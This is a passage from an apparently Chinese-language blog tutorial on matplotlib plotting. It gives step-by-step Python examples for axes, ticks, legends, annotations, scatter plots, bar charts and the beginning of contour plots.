5). 使用<code>plt.plot</code>画(<code>x</code> ,<code>y2</code>)曲线. 使用<code>plt.plot</code>画(<code>x</code> ,<code>y1</code>)曲线，曲线的颜色属性(<code>color</code>)为红色;曲线的宽度(<code>linewidth</code>)为1.0；曲线的类型(<code>linestyle</code>)为虚线. 使用<code>plt.show</code>显示图像.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, <span class="number">50</span>)</span><br><span class="line">y1 = <span class="number">2</span>*x + <span class="number">1</span></span><br><span class="line">y2 = x**<span class="number">2</span></span><br><span class="line">plt.figure(num=<span class="number">3</span>, figsize=(<span class="number">8</span>, <span class="number">5</span>),)</span><br><span class="line">plt.plot(x, y2)</span><br><span class="line">plt.plot(x, y1, color=<span class="string">'red'</span>, linewidth=<span class="number">1.0</span>, linestyle=<span class="string">'--'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="设置坐标轴"><a href="#设置坐标轴" class="headerlink" title="设置坐标轴"></a>设置坐标轴</h3><h4 id="调整坐标轴名字和间隔"><a href="#调整坐标轴名字和间隔" class="headerlink" title="调整坐标轴名字和间隔"></a>调整坐标轴名字和间隔</h4><p>使用<code>plt.xlim</code>设置x坐标轴范围：(-1, 2)； 使用<code>plt.ylim</code>设置y坐标轴范围：(-2, 3)； 使用<code>plt.xlabel</code>设置x坐标轴名称：’I am x’； 使用<code>plt.ylabel</code>设置y坐标轴名称：’I am y’；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x=np.linspace(<span class="number">-3</span>,<span class="number">3</span>,<span class="number">50</span>)</span><br><span class="line">y1=<span class="number">2</span>*x+<span class="number">1</span></span><br><span class="line">y2=x**<span class="number">2</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(x, y2)</span><br><span class="line">plt.plot(x, y1, color=<span class="string">'red'</span>, linewidth=<span class="number">1.0</span>, linestyle=<span class="string">'--'</span>)</span><br><span class="line">plt.xlim((<span class="number">-1</span>, <span class="number">2</span>))</span><br><span class="line">plt.ylim((<span class="number">-2</span>, <span class="number">3</span>))</span><br><span class="line">plt.xlabel(<span class="string">'I am x'</span>)</span><br><span class="line">plt.ylabel(<span class="string">'I am y'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>使用<code>np.linspace</code>定义范围以及个数：范围是(-1,2);个数是5. 使用<code>print</code>打印出新定义的范围. 使用<code>plt.xticks</code>设置x轴刻度：范围是(-1,2);个数是5.</p><p>使用<code>plt.yticks</code>设置y轴刻度以及名称：刻度为[-2, -1.8, -1, 1.22, 3]；对应刻度的名称为[‘really bad’,’bad’,’normal’,’good’, ‘really good’]. 使用<code>plt.show</code>显示图像.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x=np.linspace(<span class="number">-3</span>,<span class="number">3</span>,<span class="number">50</span>)</span><br><span class="line">y1=<span class="number">2</span>*x+<span class="number">1</span></span><br><span class="line">y2=x**<span class="number">2</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(x, y2)</span><br><span class="line">plt.plot(x, y1, color=<span class="string">'red'</span>, linewidth=<span class="number">1.0</span>, linestyle=<span class="string">'--'</span>)</span><br><span class="line">plt.xlim((<span class="number">-1</span>, <span class="number">2</span>))</span><br><span class="line">plt.ylim((<span class="number">-2</span>, <span class="number">3</span>))</span><br><span class="line">plt.xlabel(<span class="string">'I am x'</span>)</span><br><span class="line">plt.ylabel(<span class="string">'I am y'</span>)</span><br><span class="line">new_ticks = np.linspace(<span class="number">-1</span>, <span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line">print(new_ticks)</span><br><span class="line">plt.xticks(new_ticks)</span><br><span class="line">plt.yticks([<span class="number">-2</span>, <span class="number">-1.8</span>, <span class="number">-1</span>, <span class="number">1.22</span>, <span class="number">3</span>],[<span class="string">r'$really\ bad$'</span>, <span class="string">r'$bad$'</span>, <span class="string">r'$normal$'</span>, <span class="string">r'$good$'</span>, <span class="string">r'$really\ good$'</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>使用<code>plt.gca</code>获取当前坐标轴信息. 使用<code>.spines</code>设置边框：右侧边框；使用<code>.set_color</code>设置边框颜色：默认白色； 使用<code>.spines</code>设置边框：上边框；使用<code>.set_color</code>设置边框颜色：默认白色；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ax = plt.gca()</span><br><span class="line">ax.spines[<span class="string">'right'</span>].set_color(<span class="string">'none'</span>)</span><br><span class="line">ax.spines[<span class="string">'top'</span>].set_color(<span class="string">'none'</span>)</span><br></pre></td></tr></table></figure><h4 id="调整坐标轴"><a href="#调整坐标轴" class="headerlink" title="调整坐标轴"></a>调整坐标轴</h4><p>使用<code>.xaxis.set_ticks_position</code>设置x坐标刻度数字或名称的位置：<code>bottom</code>.（所有位置：<code>top</code>，<code>bottom</code>，<code>both</code>，<code>default</code>，<code>none</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.xaxis.set_ticks_position(<span class="string">'bottom'</span>)</span><br></pre></td></tr></table></figure><p>使用<code>.spines</code>设置边框：x轴；使用<code>.set_position</code>设置边框位置：y=0的位置；（位置所有属性：<code>outward</code>，<code>axes</code>，<code>data</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.spines[<span class="string">'bottom'</span>].set_position((<span class="string">'data'</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>使用<code>.yaxis.set_ticks_position</code>设置y坐标刻度数字或名称的位置：<code>left</code>.（所有位置：<code>left</code>，<code>right</code>，<code>both</code>，<code>default</code>，<code>none</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.yaxis.set_ticks_position(<span class="string">'left'</span>)</span><br></pre></td></tr></table></figure><p>使用<code>.spines</code>设置边框：y轴；使用<code>.set_position</code>设置边框位置：x=0的位置；（位置所有属性：<code>outward</code>，<code>axes</code>，<code>data</code>） 使用<code>plt.show</code>显示图像.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.spines[<span class="string">'left'</span>].set_position((<span class="string">'data'</span>,<span class="number">0</span>))</span><br></pre></td></tr></table></figure><h4 id="Legend-设置图例"><a href="#Legend-设置图例" class="headerlink" title="Legend 设置图例"></a>Legend 设置图例</h4><h5 id="添加图例"><a href="#添加图例" class="headerlink" title="添加图例"></a>添加图例</h5><p><code>legend</code>将要显示的信息来自于上面代码中的 <code>label</code>. 所以我们只需要简单写下一下代码, plt 就能自动的为我们添加图例.参数 <code>loc=&#39;upper right&#39;</code> 表示图例将添加在图中的右上角.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, <span class="number">50</span>)</span><br><span class="line">y1 = <span class="number">2</span>*x + <span class="number">1</span></span><br><span class="line">y2 = x**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line"><span class="comment">#set x limits</span></span><br><span class="line">plt.xlim((<span class="number">-1</span>, <span class="number">2</span>))</span><br><span class="line">plt.ylim((<span class="number">-2</span>, <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set new sticks</span></span><br><span class="line">new_sticks = np.linspace(<span class="number">-1</span>, <span class="number">2</span>, <span class="number">5</span>)</span><br><span class="line">plt.xticks(new_sticks)</span><br><span class="line"><span class="comment"># set tick labels</span></span><br><span class="line">plt.yticks([<span class="number">-2</span>, <span class="number">-1.8</span>, <span class="number">-1</span>, <span class="number">1.22</span>, <span class="number">3</span>],</span><br><span class="line">           [<span class="string">r'$really\ bad$'</span>, <span class="string">r'$bad$'</span>, <span class="string">r'$normal$'</span>, <span class="string">r'$good$'</span>, <span class="string">r'$really\ good$'</span>])</span><br><span class="line"><span class="comment"># set line syles</span></span><br><span class="line">l1, = plt.plot(x, y1, label=<span class="string">'linear line'</span>)</span><br><span class="line">l2, = plt.plot(x, y2, color=<span class="string">'red'</span>, linewidth=<span class="number">1.0</span>, linestyle=<span class="string">'--'</span>, label=<span class="string">'square line'</span>)</span><br><span class="line"><span class="comment"># add legend</span></span><br><span class="line">plt.legend(loc=<span class="string">'upper right'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h5 id="调整位置和名称"><a href="#调整位置和名称" class="headerlink" title="调整位置和名称"></a>调整位置和名称</h5><p>如果我们想单独修改之前的 <code>label</code> 信息, 给不同类型的线条设置图例信息. 我们可以在 <code>plt.legend</code> 输入更多参数. 如果以下面这种形式添加 legend, 我们需要确保, 在上面的代码 <code>plt.plot(x, y2, label=&#39;linear line&#39;)</code> 和 <code>plt.plot(x, y1, label=&#39;square line&#39;)</code> 中有用变量 <code>l1</code> 和 <code>l2</code> 分别存储起来. 而且需要注意的是 <code>l1,</code> <code>l2,</code>要以逗号结尾, 因为<code>plt.plot()</code> 返回的是一个列表.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt.legend(handles=[l1, l2], labels=[<span class="string">'up'</span>, <span class="string">'down'</span>],  loc=<span class="string">'best'</span>)</span><br></pre></td></tr></table></figure><p>这样我们就能分别重新设置线条对应的 <code>label</code> 了.</p><p>其中’loc’参数有多种，’best’表示自动分配最佳位置，其余的如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'best'</span> : <span class="number">0</span>,          </span><br><span class="line"><span class="string">'upper right'</span>  : <span class="number">1</span>,</span><br><span class="line"><span class="string">'upper left'</span>   : <span class="number">2</span>,</span><br><span class="line"><span class="string">'lower left'</span>   : <span class="number">3</span>,</span><br><span class="line"><span class="string">'lower right'</span>  : <span class="number">4</span>,</span><br><span class="line"><span class="string">'right'</span>        : <span class="number">5</span>,</span><br><span class="line"><span class="string">'center left'</span>  : <span class="number">6</span>,</span><br><span class="line"><span class="string">'center right'</span> : <span class="number">7</span>,</span><br><span class="line"><span class="string">'lower center'</span> : <span class="number">8</span>,</span><br><span class="line"><span class="string">'upper center'</span> : <span class="number">9</span>,</span><br><span class="line"><span class="string">'center'</span>       : <span class="number">10</span>,</span><br></pre></td></tr></table></figure><h4 id="Annotation-标注"><a href="#Annotation-标注" class="headerlink" title="Annotation 标注"></a>Annotation 标注</h4><h5 id="画出基本图"><a href="#画出基本图" class="headerlink" title="画出基本图"></a>画出基本图</h5><p>当图线中某些特殊地方需要标注时，我们可以使用 <code>annotation</code>. matplotlib 中的 <code>annotation</code> 有两种方法， 一种是用 plt 里面的 <code>annotate</code>，一种是直接用 plt 里面的 <code>text</code> 来写标注.</p><p>首先，我们在坐标轴中绘制一条直线.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, <span class="number">50</span>)</span><br><span class="line">y = <span class="number">2</span>*x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">plt.figure(num=<span class="number">1</span>, figsize=(<span class="number">8</span>, <span class="number">5</span>),)</span><br><span class="line">plt.plot(x, y,)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h5 id="移动坐标"><a href="#移动坐标" class="headerlink" title="移动坐标"></a>移动坐标</h5><p>挪动坐标轴的位置.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ax = plt.gca()</span><br><span class="line">ax.spines[<span class="string">'right'</span>].set_color(<span class="string">'none'</span>)</span><br><span class="line">ax.spines[<span class="string">'top'</span>].set_color(<span class="string">'none'</span>)</span><br><span class="line">ax.spines[<span class="string">'top'</span>].set_color(<span class="string">'none'</span>)</span><br><span class="line">ax.xaxis.set_ticks_position(<span class="string">'bottom'</span>)</span><br><span class="line">ax.spines[<span class="string">'bottom'</span>].set_position((<span class="string">'data'</span>, <span class="number">0</span>))</span><br><span class="line">ax.yaxis.set_ticks_position(<span class="string">'left'</span>)</span><br><span class="line">ax.spines[<span class="string">'left'</span>].set_position((<span class="string">'data'</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>然后标注出点<code>(x0, y0)</code>的位置信息. 用<code>plt.plot([x0, x0,], [0, y0,], &#39;k--&#39;, linewidth=2.5)</code> 画出一条垂直于x轴的虚线.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x0 = <span class="number">1</span></span><br><span class="line">y0 = <span class="number">2</span>*x0 + <span class="number">1</span></span><br><span class="line">plt.plot([x0, x0,], [<span class="number">0</span>, y0,], <span class="string">'k--'</span>, linewidth=<span class="number">2.5</span>)</span><br><span class="line"><span class="comment"># set dot styles</span></span><br><span class="line">plt.scatter([x0, ], [y0, ], s=<span class="number">50</span>, color=<span class="string">'b'</span>)</span><br></pre></td></tr></table></figure><h5 id="添加注释-annotate"><a href="#添加注释-annotate" class="headerlink" title="添加注释 annotate"></a>添加注释 annotate</h5><p>对<code>(x0, y0)</code>这个点进行标注.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt.annotate(<span class="string">r'$2x+1=%s$'</span> % y0, xy=(x0, y0), xycoords=<span class="string">'data'</span>, xytext=(+<span class="number">30</span>, <span class="number">-30</span>),</span><br><span class="line">             textcoords=<span class="string">'offset points'</span>, fontsize=<span class="number">16</span>,</span><br><span class="line">             arrowprops=dict(arrowstyle=<span class="string">'-&gt;'</span>, connectionstyle=<span class="string">"arc3,rad=.2"</span>))</span><br></pre></td></tr></table></figure><p>其中参数<code>xycoords=&#39;data&#39;</code> 是说基于数据的值来选位置, <code>xytext=(+30, -30)</code> 和 <code>textcoords=&#39;offset points&#39;</code> 对于标注位置的描述 和 xy 偏差值, <code>arrowprops</code>是对图中箭头类型的一些设置.</p><h5 id="添加注释-text"><a href="#添加注释-text" class="headerlink" title="添加注释 text"></a>添加注释 text</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.text(<span class="number">-3.7</span>, <span class="number">3</span>, <span class="string">r'$This\ is\ the\ some\ text. \mu\ \sigma_i\ \alpha_t$'</span>,</span><br><span class="line">         fontdict=&#123;<span class="string">'size'</span>: <span class="number">16</span>, <span class="string">'color'</span>: <span class="string">'r'</span>&#125;)</span><br></pre></td></tr></table></figure><p>其中<code>-3.7, 3,</code>是选取text的位置, 空格需要用到转字符<code>\</code>,<code>fontdict</code>设置文本字体.</p><h4 id="tick-能见度"><a href="#tick-能见度" class="headerlink" title="tick 能见度"></a>tick 能见度</h4><p>当图片中的内容较多，相互遮盖时，我们可以通过设置相关内容的透明度来使图片更易于观察，也即是通过<code>bbox</code>参数设置来调节图像信息.</p><h5 id="生成图形"><a href="#生成图形" class="headerlink" title="生成图形"></a>生成图形</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, <span class="number">50</span>)</span><br><span class="line">y = <span class="number">0.1</span>*x</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line"><span class="comment"># 在 plt 2.0.2 或更高的版本中, 设置 zorder 给 plot 在 z 轴方向排序</span></span><br><span class="line">plt.plot(x, y, linewidth=<span class="number">10</span>, zorder=<span class="number">1</span>)</span><br><span class="line">plt.ylim(<span class="number">-2</span>, <span class="number">2</span>)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">ax.spines[<span class="string">'right'</span>].set_color(<span class="string">'none'</span>)</span><br><span class="line">ax.spines[<span class="string">'top'</span>].set_color(<span class="string">'none'</span>)</span><br><span class="line">ax.spines[<span class="string">'top'</span>].set_color(<span class="string">'none'</span>)</span><br><span class="line">ax.xaxis.set_ticks_position(<span class="string">'bottom'</span>)</span><br><span class="line">ax.spines[<span class="string">'bottom'</span>].set_position((<span class="string">'data'</span>, <span class="number">0</span>))</span><br><span class="line">ax.yaxis.set_ticks_position(<span class="string">'left'</span>)</span><br><span class="line">ax.spines[<span class="string">'left'</span>].set_position((<span class="string">'data'</span>, <span class="number">0</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h5 id="调整坐标"><a href="#调整坐标" class="headerlink" title="调整坐标"></a>调整坐标</h5><p>对被遮挡的图像调节相关透明度，本例中设置 x轴 和 y轴 的刻度数字进行透明度设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> label <span class="keyword">in</span> ax.get_xticklabels() + ax.get_yticklabels():</span><br><span class="line">    label.set_fontsize(<span class="number">12</span>)</span><br><span class="line">    <span class="comment"># 在 plt 2.0.2 或更高的版本中, 设置 zorder 给 plot 在 z 轴方向排序</span></span><br><span class="line">    label.set_bbox(dict(facecolor=<span class="string">'white'</span>, edgecolor=<span class="string">'None'</span>, alpha=<span class="number">0.7</span>, zorder=<span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>其中<code>label.set_fontsize(12)</code>重新调节字体大小，<code>bbox</code>设置目的内容的透明度相关参，<code>facecolor</code>调节 <code>box</code> 前景色，<code>edgecolor</code> 设置边框， 本处设置边框为无，<code>alpha</code>设置透明度.</p><h2 id="画图种类"><a href="#画图种类" class="headerlink" title="画图种类"></a>画图种类</h2><h3 id="Scatter-散点图"><a href="#Scatter-散点图" class="headerlink" title="Scatter 散点图"></a>Scatter 散点图</h3><p>生成1024个呈标准正态分布的二维数据组 (平均数是0，方差为1) 作为一个数据集，并图像化这个数据集。每一个点的颜色值用<code>T</code>来表示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">n = <span class="number">1024</span>    <span class="comment"># data size</span></span><br><span class="line">X = np.random.normal(<span class="number">0</span>, <span class="number">1</span>, n) <span class="comment"># 每一个点的X值</span></span><br><span class="line">Y = np.random.normal(<span class="number">0</span>, <span class="number">1</span>, n) <span class="comment"># 每一个点的Y值</span></span><br><span class="line">T = np.arctan2(Y,X) <span class="comment"># for color value</span></span><br></pre></td></tr></table></figure><p>数据集生成完毕，现在来用<code>scatter</code>plot这个点集。输入<code>X</code>和<code>Y</code>作为location，<code>size=75</code>，颜色为<code>T</code>，<code>color map</code>用默认值，透明度<code>alpha</code> 为 50%。 x轴显示范围定位(-1.5，1.5)，并用<code>xtick()</code>函数来隐藏x坐标轴，y轴同理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">n = <span class="number">1024</span>    <span class="comment"># data size</span></span><br><span class="line">X = np.random.normal(<span class="number">0</span>, <span class="number">1</span>, n) <span class="comment"># 每一个点的X值</span></span><br><span class="line">Y = np.random.normal(<span class="number">0</span>, <span class="number">1</span>, n) <span class="comment"># 每一个点的Y值</span></span><br><span class="line">T = np.arctan2(Y,X) <span class="comment"># for color value</span></span><br><span class="line">plt.scatter(X, Y, s=<span class="number">75</span>, c=T, alpha=<span class="number">.5</span>)</span><br><span class="line"></span><br><span class="line">plt.xlim(<span class="number">-1.5</span>, <span class="number">1.5</span>)</span><br><span class="line">plt.xticks(())  <span class="comment"># ignore xticks</span></span><br><span class="line">plt.ylim(<span class="number">-1.5</span>, <span class="number">1.5</span>)</span><br><span class="line">plt.yticks(())  <span class="comment"># ignore yticks</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="Bar-柱状图"><a href="#Bar-柱状图" class="headerlink" title="Bar 柱状图"></a>Bar 柱状图</h3><h4 id="生成基本图形"><a href="#生成基本图形" class="headerlink" title="生成基本图形"></a>生成基本图形</h4><p>向上向下分别生成12个数据，X为 0 到 11 的整数 ，Y是相应的均匀分布的随机数据。 使用的函数是<code>plt.bar</code>，参数为X和Y：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">n = <span class="number">12</span></span><br><span class="line">X = np.arange(n)</span><br><span class="line">Y1 = (<span class="number">1</span> - X / float(n)) * np.random.uniform(<span class="number">0.5</span>, <span class="number">1.0</span>, n)</span><br><span class="line">Y2 = (<span class="number">1</span> - X / float(n)) * np.random.uniform(<span class="number">0.5</span>, <span class="number">1.0</span>, n)</span><br><span class="line"></span><br><span class="line">plt.bar(X, +Y1)</span><br><span class="line">plt.bar(X, -Y2)</span><br><span class="line"></span><br><span class="line">plt.xlim(<span class="number">-.5</span>, n)</span><br><span class="line">plt.xticks(())</span><br><span class="line">plt.ylim(<span class="number">-1.25</span>, <span class="number">1.25</span>)</span><br><span class="line">plt.yticks(())</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h4 id="加颜色和数据"><a href="#加颜色和数据" class="headerlink" title="加颜色和数据"></a>加颜色和数据</h4><p>用<code>facecolor</code>设置主体颜色，<code>edgecolor</code>设置边框颜色为白色:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.bar(X, +Y1, facecolor=<span class="string">'#9999ff'</span>, edgecolor=<span class="string">'white'</span>)</span><br><span class="line">plt.bar(X, -Y2, facecolor=<span class="string">'#ff9999'</span>, edgecolor=<span class="string">'white'</span>)</span><br></pre></td></tr></table></figure><p>接下来我们用函数<code>plt.text</code>分别在柱体上方（下方）加上数值，用<code>%.2f</code>保留两位小数，横向居中对齐<code>ha=&#39;center&#39;</code>，纵向底部（顶部）对齐<code>va=&#39;bottom&#39;</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x, y <span class="keyword">in</span> zip(X, Y1):</span><br><span class="line">    <span class="comment"># ha: horizontal alignment</span></span><br><span class="line">    <span class="comment"># va: vertical alignment</span></span><br><span class="line">    plt.text(x + <span class="number">0.4</span>, y + <span class="number">0.05</span>, <span class="string">'%.2f'</span> % y, ha=<span class="string">'center'</span>, va=<span class="string">'bottom'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x, y <span class="keyword">in</span> zip(X, Y2):</span><br><span class="line">    <span class="comment"># ha: horizontal alignment</span></span><br><span class="line">    <span class="comment"># va: vertical alignment</span></span><br><span class="line">    plt.text(x + <span class="number">0.4</span>, -y - <span class="number">0.05</span>, <span class="string">'%.2f'</span> % y, ha=<span class="string">'center'</span>, va=<span class="string">'top'</span>)</span><br></pre></td></tr></table></figure><h3 id="Contours-等高线图"><a href="#Contours-等高线图" class="headerlink" title="Contours 等高线图"></a>Contours 等高线图</h3><h4 id="画等高线"><a href="#画等高线" class="headerlink" title="画等高线"></a>画等高线</h4><p>数据集即三维点 (x,y) 和对应的高度值，共有256个点。高度值使用一个 height function <code>f(x,y)</code> 生成。 x, y 分别是在区间 [-3,3] 中均匀分布的256个值，并用<code>meshgrid</code>在二维平面中将每一个x和每一个y分别对应起来，编织成栅格:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="comment"># the height function</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span> - x / <span class="number">2</span> + x**<span class="number">5</span> + y**<span class="number">3</span>) * np.exp(-x**<span class="number">2</span> -y**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">256</span></span><br><span class="line">x = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, n)</span><br><span class="line">y = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, n)</span><br><span class="line">X,Y = np.meshgrid(x, 